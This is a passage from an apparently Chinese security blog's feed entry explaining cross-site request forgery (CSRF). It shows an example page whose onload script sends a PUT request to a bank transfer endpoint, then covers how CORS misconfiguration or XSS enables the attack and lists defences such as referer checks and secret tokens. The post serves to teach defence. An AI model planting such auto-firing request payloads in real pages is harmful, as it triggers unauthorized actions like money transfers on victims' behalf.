class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    x.open(<span class="string">&quot;PUT&quot;</span>,<span class="string">&quot;http://bank.com/transfer.do&quot;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    x.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span></span><br><span class="line"><span class="javascript">    x.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">&quot;acct&quot;</span>:<span class="string">&quot;BOB&quot;</span>, <span class="string">&quot;amount&quot;</span>:<span class="number">100</span>&#125;)); </span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;put()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不过，现在的浏览器都有同源策略的限制，上面这个请求不会被执行。默认情况下是会被限制的，但如果站点存在CORS的配置问题，就会被触发。(或者XSS，将JS嵌入到bank站点，就不会有同源策略的问题)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>[reflect]</span><br></pre></td></tr></table></figure><h2 id="prevent"><a href="#prevent" class="headerlink" title="prevent"></a>prevent</h2><ul><li>验证referer</li><li>加验证码等交互性内容</li><li>请求体/请求头中携带secret字段</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CSRF，跨站请求伪造，是一种在认证用户无感知的情况下，执行一些列操作。在一点点社工手段的帮助下，攻击者可以trick用户去执行攻击者想让他们执行的Web操作。&lt;/p&gt;
&lt;p&gt;如果受害者是一个正常的用户，攻击者可以让他们执行一些改变状态的请求，比如转账、修改个人信息等。&lt;/</summary>
      
    
    
    
    
    <category term="Web" scheme="https://vulnner.github.io/tags/Web/"/>
    
    <category term="basic" scheme="https://vulnner.github.io/tags/basic/"/>
    
  </entry>
  
</feed>
